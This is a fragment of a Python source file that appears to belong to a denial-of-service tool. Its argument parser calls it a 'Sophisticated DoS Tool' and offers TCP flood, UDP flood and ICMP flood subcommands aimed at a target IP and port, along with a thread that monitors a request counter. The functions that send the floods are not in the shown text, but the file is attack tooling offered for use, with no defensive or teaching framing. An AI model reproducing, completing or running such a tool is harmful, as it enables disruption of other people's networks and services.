def set_flag(val):
    global flag
    flag = val

class MonitorThread(threading.Thread):
    def run(self):
        global request_counter, flag
        previous = request_counter
        print(f"{Fore.YELLOW}Monitor thread started.")
        while flag == 0:
            if previous + 100 < request_counter:
                print(f"{Fore.YELLOW}Request counter incremented: {request_counter}")
                previous = request_counter
        print(f"{Fore.YELLOW}Monitor thread ending.")

def main():
    parser = argparse.ArgumentParser(description='Sophisticated DoS Tool')
    subparsers = parser.add_subparsers(dest='command')

    flood_parser = subparsers.add_parser('flood', help='Initiate a targeted TCP Flood attack (Takes time)')
    flood_parser.add_argument('--ip', required=True, help='Target IP address')
    flood_parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    flood_parser.set_defaults(func=flood_command)

    udp_flood_parser = subparsers.add_parser('udp-flood', help='Launch a massive UDP Flood attack on the target (Mostly not effective)')
    udp_flood_parser.add_argument('--ip', required=True, help='Target IP address')
    udp_flood_parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    udp_flood_parser.set_defaults(func=udp_flood_command)

    icmp_flood_parser = subparsers.add_parser('icmp-flood', help='Deploy an ICMP Flood attack')
    icmp_flood_parser.add_argument('--ip', required=True, help='Target IP address')
    icmp_flood_parser.set_defaults(func=icmp_flood_command)

    args = parser.parse_args()

    if args.command is None:
        show_help()
    else:
        display_banner()
        monitor_thread = MonitorThread()
        monitor_thread.start()
        args.func(args)
        monitor_thread.join()

if __name__ == '__main__':
    main()